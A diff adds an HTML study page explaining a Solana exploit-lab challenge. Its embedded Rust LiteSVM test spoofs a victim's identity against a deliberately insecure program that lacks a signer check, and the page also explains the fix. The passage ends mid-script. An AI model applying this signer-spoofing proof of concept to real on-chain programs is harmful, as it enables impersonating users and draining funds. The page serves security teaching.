@@ -1,0 +1,987 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Solana Exploit Lab // Challenge 0: Missing Signer</title>
+
+  <!-- Tailwind CSS via CDN for rapid, responsive styling -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Google Fonts: Inter for crisp UI copy, Fira Code for monospace Rust code -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+  <!-- Lucide Icons via CDN -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+
+  <!-- Tailwind Configuration: Custom fonts and Solana-inspired cyber-deck palette -->
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['Fira Code', 'monospace'],
+          },
+          colors: {
+            cyber: {
+              bg: '#09090b',       // Deep obsidian background
+              card: '#111114',     // Elevated card surface
+              hover: '#18181d',    // Interactive hover state
+              border: '#27272a',   // Subtle hairline border
+              solana: '#14F195',   // Solana Mint Green
+              purple: '#9945FF',   // Solana Purple
+              danger: '#ef4444',   // Exploit / Vulnerability Red
+            }
+          }
+        }
+      }
+    };
+  </script>
+
+  <style>
+    /* Custom scrollbar for sleek desktop & mobile code panes */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #09090b;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #27272a;
+      border-radius: 9999px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #3f3f46;
+    }
+
+    /* Smooth highlight transition when selecting code blocks */
+    .code-block-group {
+      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+  </style>
+</head>
+
+<body class="bg-cyber-bg text-zinc-200 font-sans antialiased selection:bg-cyber-purple/30 selection:text-cyber-solana">
+
+  <!-- =====================================================================
+       TOP NAVIGATION HEADER
+       Sticky header with repository context, mobile view switcher, and quick tools
+       ===================================================================== -->
+  <header class="sticky top-0 z-40 border-b border-cyber-border bg-cyber-bg/90 backdrop-blur-md">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between gap-4">
+      
+      <!-- Brand / File Title -->
+      <div class="flex items-center gap-3 min-w-0">
+        <div class="w-9 h-9 rounded-lg bg-gradient-to-br from-cyber-purple/20 to-cyber-solana/20 border border-cyber-solana/30 flex items-center justify-center shrink-0">
+          <i data-lucide="shield-alert" class="w-5 h-5 text-cyber-solana"></i>
+        </div>
+        <div class="min-w-0">
+          <div class="flex items-center gap-2">
+            <span class="text-xs font-mono text-cyber-solana uppercase tracking-wider font-semibold">Solana Exploit Lab</span>
+            <span class="hidden sm:inline-block text-zinc-600">•</span>
+            <span class="hidden sm:inline-block text-xs font-mono text-zinc-400">Sealevel Attacks #0</span>
+          </div>
+          <h1 class="text-sm sm:text-base font-semibold text-white truncate font-mono">
+            tests/challenge_0_signer.rs
+          </h1>
+        </div>
+      </div>
+
+      <!-- Right Action Controls -->
+      <div class="flex items-center gap-2 shrink-0">
+        <!-- Toggle Fully Commented Code Modal/Drawer Button -->
+        <button
+          id="toggleFullCodeBtn"
+          class="flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-medium bg-cyber-card hover:bg-cyber-hover border border-cyber-border text-zinc-300 hover:text-white transition"
+          title="View or copy the complete Rust test file with inline beginner comments"
+        >
+          <i data-lucide="file-code-2" class="w-4 h-4 text-cyber-purple"></i>
+          <span class="hidden sm:inline">Full Commented File</span>
+          <span class="sm:hidden">Full File</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Mobile Tab Bar (Visible only on screens < 1024px) -->
+    <div class="lg:hidden grid grid-cols-2 border-t border-cyber-border bg-cyber-card/60">
+      <button
+        id="mobileTabCode"
+        onclick="switchMobileTab('code')"
+        class="py-2.5 text-xs font-semibold flex items-center justify-center gap-2 border-b-2 border-cyber-solana text-cyber-solana transition"
+      >
+        <i data-lucide="terminal" class="w-3.5 h-3.5"></i>
+        Interactive Code
+      </button>
+      <button
+        id="mobileTabExplain"
+        onclick="switchMobileTab('explain')"
+        class="py-2.5 text-xs font-semibold flex items-center justify-center gap-2 border-b-2 border-transparent text-zinc-400 hover:text-zinc-200 transition"
+      >
+        <i data-lucide="book-open" class="w-3.5 h-3.5"></i>
+        Deep-Dive Breakdown
+      </button>
+    </div>
+  </header>
+
+  <!-- =====================================================================
+       EXECUTIVE OVERVIEW BANNER (Mental Model for Beginners)
+       ===================================================================== -->
+  <section class="max-w-7xl mx-auto px-4 sm:px-6 pt-6 pb-2">
+    <div class="rounded-xl bg-gradient-to-r from-cyber-card via-[#14121d] to-cyber-card border border-cyber-border p-4 sm:p-5">
+      <div class="flex flex-col md:flex-row md:items-center justify-between gap-4">
+        <div class="space-y-1">
+          <div class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[11px] font-mono font-medium bg-red-500/10 text-red-400 border border-red-500/20">
+            <span class="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse"></span>
+            VULNERABILITY: MISSING SIGNER CHECK
+          </div>
+          <h2 class="text-lg sm:text-xl font-bold text-white">
+            How This Exploit Works in Plain English
+          </h2>
+          <p class="text-sm text-zinc-400 max-w-3xl leading-relaxed">
+            In Solana, every instruction lists the accounts it wants to interact with. If an on-chain program reads an account's public key (<code class="text-cyber-solana font-mono text-xs">victim.pubkey()</code>) without verifying that the account actually <strong class="text-zinc-200">cryptographically signed</strong> the transaction, an attacker can pass anyone's address and impersonate them.
+          </p>
+        </div>
+
+        <!-- Step Pill Navigation -->
+        <div class="flex items-center gap-1.5 flex-wrap shrink-0" id="stepPillsContainer">
+          <!-- Populated dynamically by JavaScript -->
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- =====================================================================
+       MAIN SPLIT WORKSPACE (Left: Interactive Code | Right: Explanation Card)
+       ===================================================================== -->
+  <main class="max-w-7xl mx-auto px-4 sm:px-6 py-4">
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
+
+      <!-- LEFT COLUMN (7 cols on Desktop): Interactive Annotated Code Viewer -->
+      <div id="codePane" class="lg:col-span-7 rounded-xl bg-cyber-card border border-cyber-border overflow-hidden shadow-2xl">
+        <!-- Code Window Top Bar -->
+        <div class="px-4 py-3 border-b border-cyber-border bg-zinc-950/60 flex items-center justify-between">
+          <div class="flex items-center gap-2">
+            <span class="w-3 h-3 rounded-full bg-red-500/70"></span>
+            <span class="w-3 h-3 rounded-full bg-amber-500/70"></span>
+            <span class="w-3 h-3 rounded-full bg-emerald-500/70"></span>
+            <span class="ml-2 text-xs font-mono text-zinc-400">Click any highlighted section to inspect</span>
+          </div>
+          <span id="activeStepBadge" class="text-xs font-mono px-2 py-0.5 rounded bg-cyber-purple/20 text-cyber-purple border border-cyber-purple/30">
+            Part 1 of 7
+          </span>
+        </div>
+
+        <!-- Interactive Code Blocks Container (Rendered dynamically from CODE_SECTIONS array) -->
+        <div id="interactiveCodeContainer" class="divide-y divide-zinc-900/80 font-mono text-xs sm:text-[13px] leading-relaxed overflow-x-auto">
+          <!-- Populated by JS -->
+        </div>
+      </div>
+
+      <!-- RIGHT COLUMN (5 cols on Desktop): Sticky Detailed Explanation & Notes Panel -->
+      <div id="explanationPane" class="hidden lg:block lg:col-span-5 lg:sticky lg:top-20 space-y-4">
+        
+        <!-- Primary Explanation Card -->
+        <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 sm:p-6 shadow-2xl space-y-5">
+          
+          <!-- Step Header & Prev/Next Controls -->
+          <div class="flex items-start justify-between gap-3 border-b border-cyber-border pb-4">
+            <div>
+              <div class="flex items-center gap-2 mb-1">
+                <span id="detailStepTag" class="text-xs font-mono font-semibold text-cyber-solana uppercase tracking-wider">
+                  PART 01 // IMPORTS
+                </span>
+                <span id="detailLinesTag" class="text-xs font-mono text-zinc-500">
+                  Lines 1–8
+                </span>
+              </div>
+              <h3 id="detailTitle" class="text-lg sm:text-xl font-bold text-white">
+                Section Title
+              </h3>
+            </div>
+
+            <!-- Prev / Next Navigation Buttons -->
+            <div class="flex items-center gap-1.5 shrink-0">
+              <button
+                id="prevBtn"
+                onclick="navigateStep(-1)"
+                class="p-2 rounded-lg bg-zinc-900 hover:bg-zinc-800 border border-cyber-border text-zinc-300 disabled:opacity-30 disabled:cursor-not-allowed transition"
+                title="Previous Section"
+              >
+                <i data-lucide="chevron-left" class="w-4 h-4"></i>
+              </button>
+              <button
+                id="nextBtn"
+                onclick="navigateStep(1)"
+                class="p-2 rounded-lg bg-zinc-900 hover:bg-zinc-800 border border-cyber-border text-zinc-300 disabled:opacity-30 disabled:cursor-not-allowed transition"
+                title="Next Section"
+              >
+                <i data-lucide="chevron-right" class="w-4 h-4"></i>
+              </button>
+            </div>
+          </div>
+
+          <!-- Beginner Summary (What it does) -->
+          <div class="space-y-2">
+            <h4 class="text-xs font-mono uppercase tracking-wider text-zinc-400 flex items-center gap-1.5">
+              <i data-lucide="cpu" class="w-3.5 h-3.5 text-cyber-solana"></i>
+              What This Part Does
+            </h4>
+            <p id="detailSummary" class="text-sm text-zinc-200 leading-relaxed">
+              Summary text goes here.
+            </p>
+          </div>
+
+          <!-- Line-by-Line / Token Breakdown -->
+          <div class="space-y-2.5">
+            <h4 class="text-xs font-mono uppercase tracking-wider text-zinc-400 flex items-center gap-1.5">
+              <i data-lucide="list-tree" class="w-3.5 h-3.5 text-cyber-purple"></i>
+              Key Solana Concepts & Syntax
+            </h4>
+            <div id="detailConcepts" class="space-y-2.5">
+              <!-- Populated dynamically by JS -->
+            </div>
+          </div>
+
+          <!-- Security / Attacker Mindset Callout -->
+          <div id="detailSecurityBox" class="rounded-lg bg-red-950/20 border border-red-500/25 p-3.5 space-y-1">
+            <div class="flex items-center gap-1.5 text-xs font-mono font-semibold text-red-400">
+              <i data-lucide="flame" class="w-3.5 h-3.5"></i>
+              <span id="detailSecurityTitle">Security Takeaway</span>
+            </div>
+            <p id="detailSecurityBody" class="text-xs sm:text-sm text-zinc-300 leading-relaxed">
+              Security insight goes here.
+            </p>
+          </div>
+
+          <!-- Personal Study Notes Scratchpad (Saved in browser localStorage per section!) -->
+          <div class="pt-2 border-t border-cyber-border space-y-2">
+            <div class="flex items-center justify-between">
+              <label for="personalNotesInput" class="text-xs font-mono uppercase tracking-wider text-zinc-400 flex items-center gap-1.5">
+                <i data-lucide="notebook-pen" class="w-3.5 h-3.5 text-cyber-solana"></i>
+                Your Personal Study Notes
+              </label>
+              <span id="noteSavedIndicator" class="text-[11px] font-mono text-cyber-solana opacity-0 transition-opacity">
+                Saved locally ✓
+              </span>
+            </div>
+            <textarea
+              id="personalNotesInput"
+              rows="2"
+              placeholder="Jot down your own notes, questions, or reminders for this section..."
+              class="w-full rounded-lg bg-zinc-950 border border-cyber-border focus:border-cyber-solana focus:outline-none p-2.5 text-xs sm:text-sm text-zinc-200 placeholder-zinc-600 resize-y"
+            ></textarea>
+          </div>
+
+        </div>
+
+        <!-- Extensibility Hint Card -->
+        <div class="rounded-xl bg-cyber-card/60 border border-dashed border-cyber-border p-4 flex items-start gap-3">
+          <i data-lucide="puzzle" class="w-4 h-4 text-cyber-purple shrink-0 mt-0.5"></i>
+          <p class="text-xs text-zinc-400 leading-relaxed">
+            <strong class="text-zinc-200">Built to expand:</strong> Open this HTML file in VS Code and look for <code class="text-cyber-solana font-mono">const CODE_SECTIONS = [...]</code> in the <code class="font-mono">&lt;script&gt;</code> tag. Add new objects there to document Challenge 1, 2, or deeper Rust notes!
+          </p>
+        </div>
+
+      </div>
+    </div>
+  </main>
+
+  <!-- =====================================================================
+       MODAL: FULL COMMENTED RUST SOURCE FILE (Copy-paste ready for your repo)
+       ===================================================================== -->
+  <div id="fullCodeModal" class="fixed inset-0 z-50 hidden bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
+    <div class="bg-cyber-card border border-cyber-border rounded-2xl max-w-4xl w-full max-h-[88vh] flex flex-col shadow-2xl overflow-hidden">
+      
+      <!-- Modal Header -->
+      <div class="px-5 py-4 border-b border-cyber-border flex items-center justify-between bg-zinc-950">
+        <div class="flex items-center gap-2.5">
+          <i data-lucide="file-code-2" class="w-5 h-5 text-cyber-solana"></i>
+          <div>
+            <h3 class="text-sm sm:text-base font-bold text-white font-mono">challenge_0_signer.rs (Heavily Commented)</h3>
+            <p class="text-xs text-zinc-400">Ready to paste into your local repo or study offline</p>
+          </div>
+        </div>
+        <div class="flex items-center gap-2">
+          <button
+            id="copyFullCodeBtn"
+            onclick="copyFullCommentedCode()"
+            class="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-cyber-solana text-zinc-950 hover:bg-emerald-400 transition"
+          >
+            <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+            <span id="copyBtnText">Copy Code</span>
+          </button>
+          <button
+            id="closeModalBtn"
+            class="p-1.5 rounded-lg text-zinc-400 hover:text-white hover:bg-zinc-800 transition"
+          >
+            <i data-lucide="x" class="w-5 h-5"></i>
+          </button>
+        </div>
+      </div>
+
+      <!-- Modal Code Body -->
+      <div class="p-4 sm:p-6 overflow-y-auto bg-zinc-950 font-mono text-xs sm:text-[13px] leading-relaxed text-zinc-300">
+        <pre id="fullCommentedCodeBlock" class="whitespace-pre overflow-x-auto"></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- =====================================================================
+       APPLICATION DATA & LOGIC (Cleanly structured for easy future additions)
+       ===================================================================== -->
+  <script>
+    /**
+     * =========================================================================
+     * EXTENSIBLE DATA MODEL: CODE_SECTIONS
+     * =========================================================================
+     * How to add more detail or new sections later:
+     * 1. Copy any object `{ ... }` inside `CODE_SECTIONS`.
+     * 2. Update `id`, `stepLabel`, `lines`, `title`, `code`, `summary`, `concepts`, and `security`.
+     * 3. The UI, navigation pills, line numbers, and mobile tabs update automatically!
+     */
+    const CODE_SECTIONS = [
+      {
+        id: 'imports',
+        stepLabel: 'PART 01 // CRATE IMPORTS',
+        shortName: '1. Imports',
+        lines: 'Lines 1–8',
+        startLine: 1,
+        title: 'Importing the Local Testing & Solana Primitives',
+        code: `use litesvm::LiteSVM;
+use solana_account::Account;
+use solana_address::Address;
+use solana_instruction::{AccountMeta, Instruction};
+use solana_keypair::Keypair;
+use solana_signer::Signer;
+use solana_transaction::Transaction;
+use std::str::FromStr;`,
+        summary:
+          'Instead of spinning up a slow local validator node, this exploit test uses LiteSVM—an ultra-fast, in-memory Solana Virtual Machine that runs directly inside your Rust test process. These imports pull in the core building blocks needed to craft fake accounts, keypairs, instructions, and transactions.',
+        concepts: [
+          {
+            term: 'litesvm::LiteSVM',
+            desc: 'A lightweight Solana VM embedded in Rust tests. It lets you directly inject compiled smart contracts (.so files) and manipulate account states without RPC network overhead.'
+          },
+          {
+            term: 'Account & Address',
+            desc: 'In Solana, EVERYTHING is an Account (wallets, token balances, and even smart contract code). Every account lives at a 32-byte public key (Address).'
+          },
+          {
+            term: 'AccountMeta & Instruction',
+            desc: 'An Instruction is a single call to a smart contract. AccountMeta tells the runtime which accounts that instruction will read/write and whether each must sign.'
+          },
+          {
+            term: 'Keypair & Signer',
+            desc: 'Keypair holds a public + private Ed25519 key pair. Importing the Signer trait unlocks the .pubkey() helper method on Keypair.'
+          }
+        ],
+        security: {
+          title: 'Auditor Insight: Why LiteSVM?',
+          body: 'Security researchers love LiteSVM (and Mollusk) because it gives god-mode control over ledger state—letting you write Proof-of-Concept (PoC) exploits in milliseconds.'
+        }
+      },
+      {
+        id: 'setup-vm',
+        stepLabel: 'PART 02 // TEST & VM INIT',
+        shortName: '2. Init VM',
+        lines: 'Lines 10–19',
+        startLine: 10,
+        title: 'Booting LiteSVM & Loading the Vulnerable Binary',
+        code: `#[test]
+fn test_missing_signer_exploit() {
+    // 1. Setup LiteSVM in-memory runtime
+    let mut svm = LiteSVM::new();
+
+    // Read the compiled .so binary directly from disk
+    let program_bytes = std::fs::read(
+        "../sealevel-attacks/programs/0-signer-authorization/insecure/target/deploy/signer_authorization_insecure.so",
+    )
+    .expect("Failed to read .so file from disk");`,
+        summary:
+          'We declare a standard Rust unit test (`#[test]`), spin up a fresh blank-slate Solana runtime (`LiteSVM::new()`), and read the compiled eBPF/SBF smart contract bytecode (`.so` shared object file) from your sibling `sealevel-attacks` repo.',
+        concepts: [
+          {
+            term: '#[test]',
+            desc: 'Rust attribute telling `cargo test` to execute this function as an automated test case.'
+          },
+          {
+            term: 'let mut svm = LiteSVM::new()',
+            desc: 'Creates a mutable instance of the simulated blockchain. It must be `mut` because deploying programs, airdropping SOL, and sending transactions mutate ledger state.'
+          },
+          {
+            term: '.so (Shared Object) Binary',
+            desc: 'When you run `cargo build-sbf`, Rust compiles your Solana program into BPF bytecode saved as a `.so` file inside `target/deploy/`.'
+          }
+        ],
+        security: {
+          title: 'Black-Box vs. White-Box Testing',
+          body: 'Notice this test only loads the compiled `.so` binary—it doesn’t even need the target program’s Rust source code at runtime, mimicking how you test closed-source mainnet programs.'
+        }
+      },
+      {
+        id: 'deploy-program',
+        stepLabel: 'PART 03 // EXECUTABLE ACCOUNT',
+        shortName: '3. Deploy .so',
+        lines: 'Lines 21–37',
+        startLine: 21,
+        title: 'Injecting the Smart Contract into the Ledger',
+        code: `    // Inject the program directly as a BPF Loader v2 executable account
+    let program_id = Address::from_str("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS").unwrap();
+    let bpf_loader_v2 = Address::from_str("BPFLoader2111111111111111111111111111111111").unwrap();
+
+    svm.set_account(
+        program_id,
+        Account {
+            lamports: 1_000_000_000,
+            data: program_bytes,
+            owner: bpf_loader_v2,
+            executable: true,
+            rent_epoch: 0,
+        },
+    )
+    .expect("Failed to load program account into LiteSVM");`,
+        summary:
+          'On Solana, smart contracts are just accounts whose `executable` flag is `true` and whose `data` field holds the compiled `.so` bytes. Here we manually write that account into LiteSVM at the hardcoded `program_id` expected by the Anchor program.',
+        concepts: [
+          {
+            term: 'program_id (Fg6PaF...)',
+            desc: 'The famous default Anchor program ID (`declare_id!(...)`). The contract expects to live at this exact address.'
+          },
+          {
+            term: 'owner: bpf_loader_v2',
+            desc: 'Every Solana account has an `owner` program. Setting the owner to Solana’s native BPF Loader tells the runtime: "The bytes inside `data` are executable machine code."'
+          },
+          {
+            term: 'lamports: 1_000_000_000',
+            desc: '1 SOL equals 1 billion lamports (10^9). Funding the program account ensures it is rent-exempt so the runtime never garbage-collects it.'
+          },
+          {
+            term: 'executable: true',
+            desc: 'Marks this account as a callable program rather than a passive data/wallet account.'
+          }
+        ],
+        security: {
+          title: 'Core Solana Architecture Rule',
+          body: 'Code and state are separated in Solana. A program account (`executable: true`) stores ONLY immutable code; user balances and data live in separate non-executable accounts.'
+        }
+      },
+      {
+        id: 'actors',
+        stepLabel: 'PART 04 // ACTORS & FUNDING',
+        shortName: '4. Actors',
+        lines: 'Lines 39–42',
+        startLine: 39,
+        title: 'Creating the Attacker & Victim Wallets',
+        code: `    // 2. Create keypairs and fund attacker
+    let attacker = Keypair::new();
+    let victim = Keypair::new();
+    svm.airdrop(&attacker.pubkey(), 1_000_000_000).unwrap();`,
+        summary:
+          'We generate two random wallets: `attacker` and `victim`. Notice that ONLY the `attacker` receives 1 SOL via airdrop to pay transaction gas fees. The `victim` has 0 SOL and never touches or signs anything in this test.',
+        concepts: [
+          {
+            term: 'Keypair::new()',
+            desc: 'Generates a cryptographically random Ed25519 keypair in memory.'
+          },
+          {
+            term: 'svm.airdrop(...)',
+            desc: 'Mints 1 SOL (1,000,000,000 lamports) directly into the attacker’s account so they can pay the transaction fee.'
+          }
+        ],
+        security: {
+          title: 'Notice What’s Missing',
+          body: 'We never access `victim`’s private key anywhere after creating it—only `victim.pubkey()` (which is public information on any blockchain).'
+        }
+      },
+      {
+        id: 'craft-instruction',
+        stepLabel: 'PART 05 // MALICIOUS PAYLOAD',
+        shortName: '5. Payload',
+        lines: 'Lines 44–54',
+        startLine: 44,
+        title: 'Crafting the Spoofed Instruction & Anchor Discriminator',
+        code: `    // 3. Construct the malicious instruction (victim is NOT marked as a signer)
+    let accounts = vec![AccountMeta::new_readonly(victim.pubkey(), false)];
+
+    // First 8 bytes of sha256("global:log_message")
+    let discriminator = vec![0x94, 0x04, 0x2c, 0x22, 0xca, 0x05, 0x53, 0x73];
+
+    let instruction = Instruction {
+        program_id,
+        accounts,
+        data: discriminator,
+    };`,
+        summary:
+          'This is the heart of the exploit. We build an `Instruction` targeting `log_message` and pass `victim.pubkey()` in the accounts list with `is_signer` explicitly set to `false`!',
+        concepts: [
+          {
+            term: 'AccountMeta::new_readonly(victim.pubkey(), false)',
+            desc: 'The second argument (`false`) means `is_signer = false`. Normally, if you pass someone else’s pubkey with `false`, the Solana runtime allows it—and expects the smart contract to verify whether `is_signer == true`.'
+          },
+          {
+            term: 'Anchor 8-Byte Discriminator',
+            desc: 'Anchor smart contracts route function calls by hashing `"global:<function_name>"` with SHA-256 and taking the first 8 bytes. `[0x94, 0x04, ...]` tells the contract: "Run the `log_message` instruction."'
+          },
+          {
+            term: 'data: discriminator',
+            desc: 'Because `log_message` takes no extra arguments besides the account, the instruction’s raw `data` payload is just those 8 discriminator bytes.'
+          }
+        ],
+        security: {
+          title: 'The Root Bug (Missing Signer Check)',
+          body: 'In the insecure program, the author used `AccountInfo<\'info>` instead of Anchor’s `Signer<\'info>` (or forgot `if !ctx.accounts.authority.is_signer`). The contract blindly trusts whatever pubkey is passed in slot 0!'
+        }
+      },
+      {
+        id: 'send-tx',
+        stepLabel: 'PART 06 // EXECUTION',
+        shortName: '6. Execute Tx',
+        lines: 'Lines 56–68',
+        startLine: 56,
+        title: 'Signing & Submitting the Transaction as the Attacker',
+        code: `    // 4. Execute transaction signed ONLY by the attacker
+    let blockhash = svm.latest_blockhash();
+    let tx = Transaction::new_signed_with_payer(
+        &[instruction],
+        Some(&attacker.pubkey()),
+        &[&attacker],
+        blockhash,
+    );
+
+    let result = svm.send_transaction(tx);
+    assert!(
+        result.is_ok(),
+        "Exploit failed: transaction was rejected with {:?}",
+        result.err()
+    );`,
+        summary:
+          'We wrap the malicious instruction inside a `Transaction`, pay for gas with `attacker`, sign it ONLY with `&[&attacker]`, and send it to LiteSVM. Because the vulnerable program never checks `is_signer`, the runtime accepts the transaction (`result.is_ok()`).',
+        concepts: [
+          {
+            term: 'svm.latest_blockhash()',
+            desc: 'Every Solana transaction requires a recent blockhash as a timestamp/nonce to prevent replay attacks.'
+          },
+          {
+            term: 'Some(&attacker.pubkey())',
+            desc: 'Designates the fee payer for this transaction.'
+          },
+          {
+            term: '&[&attacker]',
+            desc: 'The list of private keys actually signing this transaction. Notice `&victim` is NOT here!'
+          }
+        ],
+        security: {
+          title: 'How a Patched Program Reacts',
+          body: 'In the `secure/` version of Challenge 0, `send_transaction(tx)` returns an `Err` (`ConstraintSigner` / `MissingRequiredSignature`), causing this `assert!(result.is_ok())` to fail—proving the fix works.'
+        }
+      },
+      {
+        id: 'verify-logs',
+        stepLabel: 'PART 07 // PROOF OF EXPLOIT',
+        shortName: '7. Verify',
+        lines: 'Lines 70–83',
+        startLine: 70,
+        title: 'Verifying Identity Spoofing in Program Logs',
+        code: `    // 5. Verify the transaction logs show the spoofed victim public key
+    let logs = result.unwrap().logs;
+    println!("Transaction Logs:\\n{:#?}", logs);
+
+    let expected_log = format!("Program log: GM {}", victim.pubkey());
+    assert!(
+        logs.iter().any(|log| log.contains(&expected_log)),
+        "Expected log '{}' not found in logs: {:?}",
+        expected_log,
+        logs
+    );
+}`,
+        summary:
+          'Finally, we inspect the execution logs returned by the VM and confirm that the smart contract printed `"Program log: GM <VICTIM_PUBKEY>"`—proving we successfully spoofed the victim without their signature.',
+        concepts: [
+          {
+            term: 'result.unwrap().logs',
+            desc: 'Extracts the vector of strings emitted by `msg!(...)` macros inside the on-chain Solana program.'
+          },
+          {
+            term: 'logs.iter().any(...)',
+            desc: 'Searches all emitted log lines to assert that the program greeted the victim’s address as if the victim had authorized the call.'
+          }
+        ],
+        security: {
+          title: 'Real-World Impact',
+          body: 'Here the program only logs "GM", which is harmless—but in real DeFi protocols, a missing signer check lets an attacker impersonate a vault authority or user to drain funds!'
+        }
+      }
+    ];
+
+    /**
+     * =========================================================================
+     * COMPLETE COMMENTED RUST FILE (For the "Full Commented File" Modal)
+     * =========================================================================
+     */
+    const FULL_COMMENTED_RUST_FILE = `// ============================================================================
+// SOLANA EXPLOIT LAB — CHALLENGE 0: MISSING SIGNER AUTHORIZATION
+// ============================================================================
+// Vulnerability: The on-chain program reads an account's public key without
+// verifying that the account actually signed the transaction (is_signer == true).
+// Result: An attacker can pass ANY victim's public key and impersonate them.
+// ============================================================================
+
+use litesvm::LiteSVM;                                   // Fast, in-memory Solana VM for local tests
+use solana_account::Account;                            // Represents raw Solana ledger account state
+use solana_address::Address;                            // 32-byte Solana public key / address type
+use solana_instruction::{AccountMeta, Instruction};     // Instruction & account permission metadata
+use solana_keypair::Keypair;                            // Ed25519 public/private keypair generator
+use solana_signer::Signer;                              // Trait providing .pubkey() on Keypair
+use solana_transaction::Transaction;                    // Signed container holding instructions
+use std::str::FromStr;                                  // Trait to parse base58 strings into Addresses
+
+#[test]
+fn test_missing_signer_exploit() {
+    // ------------------------------------------------------------------------
+    // STEP 1: Initialize LiteSVM & Load the Vulnerable Smart Contract (.so)
+    // ------------------------------------------------------------------------
+    let mut svm = LiteSVM::new();
+
+    // Load compiled eBPF/SBF bytecode from the sibling sealevel-attacks repo
+    let program_bytes = std::fs::read(
+        "../sealevel-attacks/programs/0-signer-authorization/insecure/target/deploy/signer_authorization_insecure.so",
+    )
+    .expect("Failed to read .so file from disk");
+
+    // In Solana, smart contracts are just accounts marked \`executable: true\`
+    // and owned by the native BPF Loader program.
+    let program_id = Address::from_str("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS").unwrap();
+    let bpf_loader_v2 = Address::from_str("BPFLoader2111111111111111111111111111111111").unwrap();
+
+    svm.set_account(
+        program_id,
+        Account {
+            lamports: 1_000_000_000, // 1 SOL (rent-exempt balance)
+            data: program_bytes,     // Compiled smart contract machine code
+            owner: bpf_loader_v2,    // Tells runtime this account is an executable BPF program
+            executable: true,        // Marks account as callable code
+            rent_epoch: 0,
+        },
+    )
+    .expect("Failed to load program account into LiteSVM");
+
+    // ------------------------------------------------------------------------
+    // STEP 2: Create Attacker & Victim Keypairs (Fund ONLY the Attacker)
+    // ------------------------------------------------------------------------
+    let attacker = Keypair::new();
+    let victim = Keypair::new();
+
+    // Attacker needs SOL to pay transaction fees; victim has 0 SOL and signs nothing
+    svm.airdrop(&attacker.pubkey(), 1_000_000_000).unwrap();
+
+    // ------------------------------------------------------------------------
+    // STEP 3: Craft Malicious Instruction (Spoofing Victim with is_signer=false)
+    // ------------------------------------------------------------------------
+    // Pass the victim's public key, explicitly setting \`is_signer\` to \`false\`.
+    // Because the vulnerable program uses \`AccountInfo\` instead of \`Signer\`,
+    // it never verifies whether the victim actually signed this transaction.
+    let accounts = vec![AccountMeta::new_readonly(victim.pubkey(), false)];
+
+    // Anchor identifies instructions using the first 8 bytes of:
+    // sha256("global:log_message") -> [0x94, 0x04, 0x2c, 0x22, 0xca, 0x05, 0x53, 0x73]
+    let discriminator = vec![0x94, 0x04, 0x2c, 0x22, 0xca, 0x05, 0x53, 0x73];
+
+    let instruction = Instruction {
+        program_id,
+        accounts,
+        data: discriminator,
+    };
+
+    // ------------------------------------------------------------------------
+    // STEP 4: Sign & Send Transaction Using ONLY the Attacker's Keypair
+    // ------------------------------------------------------------------------
+    let blockhash = svm.latest_blockhash();
+    let tx = Transaction::new_signed_with_payer(
+        &[instruction],
+        Some(&attacker.pubkey()), // Fee payer: Attacker
+        &[&attacker],             // Signers: ONLY Attacker (Victim is absent!)
+        blockhash,
+    );
+
+    let result = svm.send_transaction(tx);
+    assert!(
+        result.is_ok(),
+        "Exploit failed: transaction was rejected with {:?}",
+        result.err()
+    );
+
+    // ------------------------------------------------------------------------
+    // STEP 5: Verify Program Logs Confirm Victim Impersonation
+    // ------------------------------------------------------------------------
+    let logs = result.unwrap().logs;
+    println!("Transaction Logs:\\n{:#?}", logs);
+
+    let expected_log = format!("Program log: GM {}", victim.pubkey());
+    assert!(
+        logs.iter().any(|log| log.contains(&expected_log)),
+        "Expected log '{}' not found in logs: {:?}",
+        expected_log,
+        logs
+    );
+}`;
+
+    // =========================================================================
+    // APPLICATION STATE & RENDERING ENGINE
+    // =========================================================================
+    let currentIndex = 0;
+
+    // Escape HTML entities safely before syntax-highlighting Rust code
+    function escapeHtml(str) {
+      return str
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+    }
+
+    // Lightweight, clean Rust syntax highlighter (Comments, Strings, Macros, Keywords, Types)
+    function highlightRust(code) {
+      let escaped = escapeHtml(code);
+
+      // Highlight strings first (while preserving comments separately per line)
+      return escaped
+        .split('\n')
+        .map((line) => {
+          // Check for single-line comments
+          const commentIdx = line.indexOf('//');
+          let codePart = commentIdx !== -1 ? line.slice(0, commentIdx) : line;
+          let commentPart = commentIdx !== -1 ? `<span class="text-zinc-500 italic">${line.slice(commentIdx)}</span>` : '';
+
+          // Strings
+          codePart = codePart.replace(/(".*?")/g, '<span class="text-amber-300">$1</span>');
+
+          // Attributes (#[test])
